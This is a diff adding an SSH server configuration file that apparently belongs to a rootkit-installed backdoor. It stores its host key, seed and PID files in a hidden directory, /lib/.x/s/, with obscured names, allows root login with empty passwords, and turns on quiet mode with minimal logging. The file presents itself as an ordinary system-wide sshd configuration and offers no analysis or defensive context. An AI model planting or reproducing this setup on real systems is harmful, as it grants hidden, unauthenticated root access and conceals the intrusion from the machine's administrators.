@@ -1,0 +1,31 @@
+# This is ssh server systemwide configuration file.
+
+Port 22
+ListenAddress 0.0.0.0
+HostKey /lib/.x/s/s_h_k
+RandomSeed /lib/.x/s/r_s
+ServerKeyBits 768
+LoginGraceTime 600
+KeyRegenerationInterval 3600
+PermitRootLogin yes
+IgnoreRhosts yes
+StrictModes yes
+QuietMode yes
+X11Forwarding yes
+X11DisplayOffset 10
+FascistLogging no
+PrintMotd yes
+KeepAlive yes
+SyslogFacility DAEMON
+RhostsAuthentication no
+RhostsRSAAuthentication yes
+RSAAuthentication yes
+PasswordAuthentication yes
+PermitEmptyPasswords yes
+UseLogin no
+CheckMail yes
+PidFile /lib/.x/s/pid
+# AllowHosts *.our.com friend.other.com
+# DenyHosts lowsecurity.theirs.com *.evil.org evil.org
+# Umask 022
+# SilentDeny yes
